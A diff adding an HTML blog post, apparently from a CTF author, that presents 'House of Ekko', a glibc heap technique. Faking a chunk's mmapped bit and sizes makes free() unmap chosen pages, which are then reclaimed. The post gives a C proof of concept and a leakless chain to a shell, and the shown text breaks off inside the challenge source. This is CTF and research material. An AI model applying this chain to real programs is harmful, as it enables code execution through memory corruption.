@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="/assets/images/luffy.jpg" sizes="any">
+    <link rel="icon" href="/assets/images/luffy.jpg" type="image/svg+xml">
+    <link rel="stylesheet" href="/assets/styles/global.css">
+    <title>House of ekko | Heap exploitation technique | Buddurid's blog</title>
+
+    <!-- SEO Metadata -->
+    <meta property="og:title" content="House of ekko | Heap exploitation technique | Buddurid's blog" />
+    <meta property="og:site_name" content="Buddurid's blog" />
+    <meta property="description" content="A new heap exploitation technique i made for Securinets Quals 2026" />
+    <meta property="og:description" content="A new heap exploitation technique i made for Securinets Quals 2026" />
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="http://localhost:4000/assets/images/luffy.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#FFBD3F" />
+    <link rel="canonical" href="http://localhost:4000/2026/10/19/House-of-ekko" />
+
+    <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+
+</head>
+<body><div class="load" id="load">
+    <pre class="term" id="term">buddurid@CTF:~$ </pre>
+    <script src="/assets/splashscreen.js"></script>
+</div><nav class="open">
+    <div class="hex" role="img" aria-label="Navigation bar background graphic, styled like the address panel of a hex editor.">
+        <ol><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/><li/></ol>
+    </div>
+    <ul>
+        <li id="splash-hack-zero-for-reference" aria-hidden="true">0</li><li >
+                <a href="/"
+                   title="Me">Me</a>
+            </li><li style="z-index: 1;">
+                <a href="/blog"
+                   title="Blog"highlighted>Blog</a>
+            </li><li >
+                <a href="/ctfs"
+                   title="CTFs">CTFs</a>
+            </li><li >
+                <a href="/ndays"
+                   title="Ndays">Ndays</a>
+            </li></ul>
+
+</nav>
+
+<div class="nav-toggle hamburger-container">
+    <div class="hamburger-button"></div>
+</div>
+
+
+<script>
+    const responsiveNavThreshold = 500;
+    const navOpener = document.querySelector('.nav-toggle');
+    const nav = document.querySelector('nav');
+
+    const toggle = (cl, attr) => cl.contains(attr) ? cl.remove(attr) : cl.add(attr);
+
+    navOpener.addEventListener('click', () => {
+        toggle(nav.classList, 'open');
+    });
+
+    let enabled = false;
+
+    const setResponsive = () => {
+        if (window.innerWidth < responsiveNavThreshold) {
+            if (enabled) return;
+            enabled = true;
+            nav.classList.remove('open');
+            navOpener.classList.add('enabled');
+        }
+        else {
+            if (!enabled) return;
+            enabled = false;
+            nav.classList.add('open');
+            navOpener.classList.remove('enabled');
+        }
+    };
+    setResponsive();
+    window.addEventListener('resize', setResponsive);
+</script>
+<div class="content">
+            <main>
+                <article>
+    <h1 class="post-title">House of ekko | Heap exploitation technique</h1>
+    <p class="post-author-date"><b></b><em> - October 19, 2026</em></p>
+
+
+    <div class="tags">
+
+        <strong>Categories: </strong>
+
+        
+        <span>House</span>
+        
+        <span>Heap</span>
+        
+        <span>Pwn</span>
+        
+
+    </div>
+
+    <p><i>A new heap exploitation technique i made for Securinets Quals 2026</i></p>
+
+    <hr>
+
+    <p>THIS IS ME FROM THE FUTURE : hope everyone enjoyed the ctf 😉</p>
+
+<p>This is my yearly reminder atp , that i’m looking for a VR , Pentest Or Red teaming internship for early 2027 (remote or with relocation) . Please if you have any oppotunities , DM me on discord for further details. 
+<img src="/assets/posts/house/please.jpg" alt="please" width="100" height="100" />
+<del>yes i’m getting cooked that i have to self promo</del></p>
+
+<h2 id="context">context</h2>
+<p>Since i’m authoring some pwn challs for Securinets CTF 2026 , i thought i’d put in some effort to find a new heap exploit technique that makes a good heap challenge . In the end , i decided to name this house <strong>House of Ekko</strong> .</p>
+
+<p>~<del>RIOT IF YOURE READING THIS FSM , BUFF EKKO PLEASE IM BEGGING</del></p>
+
+<h2 id="attack-surfaces">attack surfaces</h2>
+<p>having a heap exploit primitive in a more recent GLIBC , whether being an overflow , UAF , double free … leads to usually one of these situations :</p>
+<ul>
+  <li>arbitrary allocation primitive :
+    <ul>
+      <li>tcache free list corruption , most suitable , arbitrary , check free , allocation when you corrupt the freelist , requires a heap leak</li>
+      <li>tcache_stashing_unlink_attack.c</li>
+    </ul>
+  </li>
+  <li>attacks that do <code class="language-plaintext highlighter-rouge">arbitrary heap value write</code>
+    <ul>
+      <li>unsorted bin attacks (in the past)</li>
+      <li>large bin attacks</li>
+      <li>fastbin/small-bin tcache consolidation , leads to <code class="language-plaintext highlighter-rouge">arbitrary heap val write</code> on inserting the the 7th chunk
+  …</li>
+    </ul>
+  </li>
+</ul>
+
+<p>also when looking for an idea , i was testing on <code class="language-plaintext highlighter-rouge">glibc 2.43</code> . this more recent libc had added some more checks that would prevent some of these attacks , like this <strong><a href="https://patchwork.sourceware.org/project/glibc/patch/20250214053454.2346370-1-benjamin.p.kallus.gr@dartmouth.edu/#195227">large bin attack killer</a></strong> . Also in this libc version and onwards , fastbin will be removed . This leaves me with only <code class="language-plaintext highlighter-rouge">small bins</code> to research (no , unsorted bins are not real) which i know is already widely exploited so i dont think thats the best attack surface i could find .</p>
+
+<h2 id="looking-for-a-new-attack-surface">looking for a new attack surface</h2>
+
+<p>i think at this time, i tried a bunch of stuff , that didnt work out , or that ultimately led to an already existing technique when searching for a similar idea , like this <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c">house of water</a> , what it does is basically forge a new chunk header inside <code class="language-plaintext highlighter-rouge">tcache_per_thread struct</code> using the <code class="language-plaintext highlighter-rouge">int_16</code> used by tcache to keep track of how many freed chunk in each <code class="language-plaintext highlighter-rouge">tcache entry</code></p>
+
+<h2 id="the-breakthrough">THE breakthrough</h2>
+
+<p>one of the later ideas that came to mind is somehow making use of the <code class="language-plaintext highlighter-rouge">IS_MMAPED</code> bit in the chunk header . Lets have a basic look at a chunk header</p>
+
+<p><img src="/assets/posts/house/header.png" alt="img" /></p>
+
+<p>a bunch of technique already made use of the first bit <code class="language-plaintext highlighter-rouge">Previous chunk in use</code> , like backwards consolidation technique or whatever . But i never saw or heard of a technique that makes use of the <code class="language-plaintext highlighter-rouge">IS_MMAPED</code> bit .</p>
+
+<p>So if we set this bit on a normal heap chunk , what happens when we free it ?</p>
+
+<h2 id="libc-internals">Libc Internals</h2>
+
+<p>calling free , if tcache is full or no tcache is configured ends up calling <code class="language-plaintext highlighter-rouge">_int_free_chunk</code> or simply <code class="language-plaintext highlighter-rouge">__int_free</code> in older versions</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
+<span class="nf">_int_free_chunk</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="cm">/*
+    Consolidate other non-mmapped chunks as they arrive.
+  */</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chunk_is_mmapped</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
+    <span class="p">...</span>
+    <span class="n">_int_free_merge_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+    <span class="p">...</span>
+  <span class="p">}</span>
+
+  <span class="cm">/*
+    If the chunk was allocated via mmap, release via munmap().
+  */</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="p">...</span>
+    <span class="n">munmap_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+    <span class="p">...</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>so just setting up that <code class="language-plaintext highlighter-rouge">IS_MMAPED</code> bit will get us to the <code class="language-plaintext highlighter-rouge">munmap_chunk</code> function</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span>
+<span class="nf">munmap_chunk</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">pagesize</span> <span class="o">=</span> <span class="n">GLRO</span> <span class="p">(</span><span class="n">dl_pagesize</span><span class="p">);</span>
+
+  <span class="n">assert</span> <span class="p">(</span><span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">));</span>
+
+  <span class="kt">uintptr_t</span> <span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+  <span class="kt">uintptr_t</span> <span class="n">block</span> <span class="o">=</span> <span class="n">mmap_base</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+  <span class="kt">size_t</span> <span class="n">total_size</span> <span class="o">=</span> <span class="n">mmap_size</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+  <span class="cm">/* Unfortunately we have to do the compilers job by hand here.  Normally
+     we would test BLOCK and TOTAL-SIZE separately for compliance with the
+     page size.  But gcc does not recognize the optimization possibility
+     (in the moment at least) so we combine the two values into one before
+     the bit test.  */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">((</span><span class="n">block</span> <span class="o">|</span> <span class="n">total_size</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span>
+      <span class="o">||</span> <span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="o">!</span><span class="n">powerof2</span> <span class="p">(</span><span class="n">mem</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))))</span>
+    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"munmap_chunk(): invalid pointer"</span><span class="p">);</span>
+
+  <span class="cm">/* If munmap failed the process virtual memory address space is in a
+     bad shape.  Just leave the block hanging around, the process will
+     terminate shortly anyway since not much can be done.  */</span>
+  <span class="n">__munmap</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">block</span><span class="p">,</span> <span class="n">total_size</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>not a lot of checks to fullfill , and most definetely no pointer comparaisons like <code class="language-plaintext highlighter-rouge">bck</code> and <code class="language-plaintext highlighter-rouge">fwd</code> chain pointer in linked lists</p>
+
+<ol>
+  <li><strong>block</strong>
+we can see that the final chunk that got to <code class="language-plaintext highlighter-rouge">__munmap</code> , isn’t actually <code class="language-plaintext highlighter-rouge">p</code> but <code class="language-plaintext highlighter-rouge">block=mmap_base (p)</code> . here is <code class="language-plaintext highlighter-rouge">mmap_base()</code> code :</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">uintptr_t</span>
+<span class="nf">mmap_base</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">p</span> <span class="o">-</span> <span class="n">mmap_base_offset</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>and <code class="language-plaintext highlighter-rouge">mmap_base_offset()</code> is</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">size_t</span>
+<span class="nf">mmap_base_offset</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">MMAP_HP</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>which means the final chunk that gets to <code class="language-plaintext highlighter-rouge">__munmap</code> is simply <code class="language-plaintext highlighter-rouge">p - prev_size</code></p>
+
+<ol>
+  <li><strong>total_size</strong></li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">size_t</span>
+<span class="nf">mmap_size</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">mmap_base_offset</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="n">CHUNK_HDR_SZ</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>which means <code class="language-plaintext highlighter-rouge">total_size= prev_size + size + 0x10</code></p>
+
+<ol>
+  <li><strong>combining both values</strong> 
+suppose we have a heap primitve where we can control both <code class="language-plaintext highlighter-rouge">prev_size</code> and <code class="language-plaintext highlighter-rouge">size</code>.</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">munmapped_chunk=p - prev_size</code> , so if <code class="language-plaintext highlighter-rouge">prev_size = p - target_address</code> ,  <code class="language-plaintext highlighter-rouge">munmapped_chunk == target_address</code></p>
+
+<p>one note is that if p and target_address are from withing fixed offset memory segment , we wouldn’t need a leak to chose a random address from that memory segment . This will help us later in the leakless part .</p>
+
+<p>and <code class="language-plaintext highlighter-rouge">total_size= prev_size + size + 0x10</code> which is equivalent to <code class="language-plaintext highlighter-rouge">total_size= p - target_address + size + 0x10 </code> , so if wanted to munmap some <code class="language-plaintext highlighter-rouge">target_page_number</code> , we need to pass a size equal to <code class="language-plaintext highlighter-rouge">size = target_page_number - (p - target_address ) - 0x10</code></p>
+
+<p>to bypass these checks , we just need to make sure that <code class="language-plaintext highlighter-rouge">block + total_size</code> is page aligned , and if <code class="language-plaintext highlighter-rouge">mem</code> is page_aligned , second check should be bypassed as well</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">((</span><span class="n">block</span> <span class="o">|</span> <span class="n">total_size</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span>
+      <span class="o">||</span> <span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="o">!</span><span class="n">powerof2</span> <span class="p">(</span><span class="n">mem</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))))</span>
+    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"munmap_chunk(): invalid pointer"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="poc">POC</h2>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+
+<span class="p">{</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="c1">/////////////////////////////////////// setup , skip</span>
+    <span class="kt">long</span> <span class="n">tls</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">system</span> <span class="o">-</span> <span class="mh">0x4fcc0</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"tls base : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tls</span><span class="p">);</span>
+
+    <span class="kt">void</span> <span class="o">*</span><span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">sbrk</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"heap : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">heap</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"diff %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="n">tls</span> <span class="o">-</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">heap</span><span class="p">));</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">));</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0xca0</span><span class="p">);</span> <span class="c1">// this is needed to make next allocation alligned</span>
+    <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">// this will be the victim chunk we'll corrupt</span>
+    <span class="c1">///////////////////////////////////////</span>
+
+    <span class="c1">// look up the leakless part for why i want to reclain this address</span>
+    <span class="kt">long</span> <span class="n">target</span> <span class="o">=</span> <span class="n">tls</span> <span class="o">+</span> <span class="mh">0x27000</span> <span class="o">+</span> <span class="mh">0x100000</span><span class="p">;</span> <span class="c1">// target page to unmap , then reallocate for user overwrite</span>
+
+    <span class="kt">long</span> <span class="n">freed_size</span> <span class="o">=</span> <span class="mh">0x21000</span><span class="p">;</span>              <span class="c1">// size to munmap , at least 0x20000 for malloc later to be able to mmap it</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"target page to free : %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"corrupting prev_size and size of victim chunk: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"press to free the corrupted chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="o">~</span><span class="p">((</span><span class="kt">long</span><span class="p">)(</span><span class="n">target</span> <span class="o">-</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">heap</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// equivalent to ~(target - victim) ; thus heap and target address leak needed</span>
+    <span class="n">ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">freed_size</span> <span class="o">-</span> <span class="n">ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x2</span><span class="p">;</span>         <span class="c1">//</span>
+
+
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span> <span class="c1">// this internally does the below mumap line</span>
+    <span class="c1">// int res = munmap(target , 0x21000);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"press to allocate (reclaim) the freed pages"</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+
+    <span class="kt">void</span> <span class="o">*</span><span class="n">reclaim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20000</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span> <span class="c1">// this mmaps(0x21000) , and reclaims the freed pages , this internally is equivalent to the mmap line above</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"reclaimed address %p , vs target address %p</span><span class="se">\n</span><span class="s"> "</span><span class="p">,</span> <span class="n">reclaim</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">((</span><span class="n">reclaim</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">target</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/house/poc.png" alt="poc" /></p>
+
+<h2 id="pros">pros</h2>
+<ol>
+  <li>we can reclaim pages relative to the corrupted chunk without any leaks , because <code class="language-plaintext highlighter-rouge">prev_size</code> that we need to corrupt is <code class="language-plaintext highlighter-rouge">p - target_address</code> . Which means if they are at fixed offset , we dont need any leaks</li>
+  <li>we can reclaim Read-Only pages</li>
+  <li>if we munmap a page with size x , when we mmap(x) or malloc(x) , the kernel will give the latest freed chunk with that size (idk about chunks with more size) . x need to meet this condition tho <code class="language-plaintext highlighter-rouge">x &gt;= mp_.mmap_threshold</code> which is initialized at ``0x21000`</li>
+</ol>
+
+<h2 id="cons">cons</h2>
+
+<ol>
+  <li>address needs to be page aligned</li>
+  <li>we need to be careful when mumapping pages , not break anything before we can reclaim those pages .</li>
+  <li>ability to allocate at least <code class="language-plaintext highlighter-rouge">0x21000</code> bytes</li>
+  <li>if we munmap(p,0x21000) : x needs to be memory aligned , and the memory segment <code class="language-plaintext highlighter-rouge">[p , p+0x21000]</code> needs to be available and contiguous , so we can reclaim later</li>
+</ol>
+
+<p>let’s suppose we wanna reclaim this segment</p>
+
+<p><img src="/assets/posts/house/cons.png" alt="cons" /></p>
+
+<p>munmap will try to unmap the whole segment <code class="language-plaintext highlighter-rouge">[0x00005b834136b000 : 0x00005b834136b000+0x21000]</code> . but that segment doesnt exist , only this segment exists <code class="language-plaintext highlighter-rouge">[0x00005b834136b000 : 0x00005b834136b000+0x5000]</code> . munmap will still unmap these pages , and return them to the page allocator , but the marked size is <code class="language-plaintext highlighter-rouge">0x5000</code> , which is a size we can never reclaim with using <code class="language-plaintext highlighter-rouge">malloc()</code> alone . So later on when we do <code class="language-plaintext highlighter-rouge">malloc(0x21000)</code> , it won’t give us that segment . This might still be useful where <code class="language-plaintext highlighter-rouge">mmap()</code> is involved</p>
+
+<h2 id="not-yet">NOT YET</h2>
+
+<p><img src="/assets/posts/house/not_yet.png" alt="not_yet" /></p>
+
+<p>this primitive allows us to munmap and reclaim arbitrary pages with at least <code class="language-plaintext highlighter-rouge">0x21000</code> contiguous memory , it can be useful in big apps that have larger heap , or BSS . But still , we need a reliable way to constantly achieve RCE , thats when we get to the next part</p>
+
+<h2 id="house-of-muney-revived">House of Muney revived</h2>
+
+<p>the primitive allows us to munmap and reclaim at least arbitrary 0x21000 pages , even <code class="language-plaintext highlighter-rouge">read only pages</code> . Turns out there was an old exploitation technique that dealt with a similar issue , but was killed because of <code class="language-plaintext highlighter-rouge">tls</code> section being loaded right before libc . 
+I encourage you to read about this <a href="https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation">technique</a> , it’s a trully fascinating one . I will not cover details mentionned here .</p>
+
+<p>with our primitve , we can just bypass <code class="language-plaintext highlighter-rouge">tls</code> and directly free the sequence of pages that contain the <code class="language-plaintext highlighter-rouge">st_value</code> of the <code class="language-plaintext highlighter-rouge">exit()</code> function which will always be called. 
+so when we exit , we trigger <code class="language-plaintext highlighter-rouge">exit() -&gt; dl_resolve trying to resolve exit address in libc -&gt; call libc_base+st_value ()</code> , thus we can overwrite <code class="language-plaintext highlighter-rouge">st_value</code> with a <code class="language-plaintext highlighter-rouge">one_gadget</code> offset .</p>
+
+<p>this function pointer overwrite doesnt require any type of libc leak as we can see</p>
+
+<h2 id="achieving-full-leakless-chain">achieving full leakless chain</h2>
+
+<p>the POC mentionned above corrupts a chunk <code class="language-plaintext highlighter-rouge">p</code> located in the heap , but we can still corrupt an <code class="language-plaintext highlighter-rouge">mmaped</code> chunk that we got using <code class="language-plaintext highlighter-rouge">malloc(0x21000)</code> in the same way , why would we do that ? 
+That’s because usually the kernel mmaps pages right behind <code class="language-plaintext highlighter-rouge">tls</code> , which is also right behind <code class="language-plaintext highlighter-rouge">libc</code> . In other words , our corrupted chunk would be at a constant offset from libc . And according to <code class="language-plaintext highlighter-rouge">pros .1</code> , we can now target any pages at constant offset from it !!</p>
+
+<h2 id="full-chain">full chain</h2>
+<p>Chaining the last both steps , we can achieve a full shell with 0 leaks , 0 brute force . The only condition is the ability the allocate at least <code class="language-plaintext highlighter-rouge">0x21000</code> bytes</p>
+
+<p>if you are interested in the leakless POC , just solve the <a href="https://github.com/buddurid/House-of-ekko">challenge</a> lol.</p>
+
+<p>here is the chall source with every mitigation enabled :</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">alloc</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Secret's index:"</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;=</span> <span class="n">n_secrets</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid index"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"How big is your secret:"</span><span class="p">);</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d%*c"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid size"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">secrets</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">secrets</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"malloc error"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"content: "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">secrets</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">size</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Secret added"</span><span class="p">);</span>
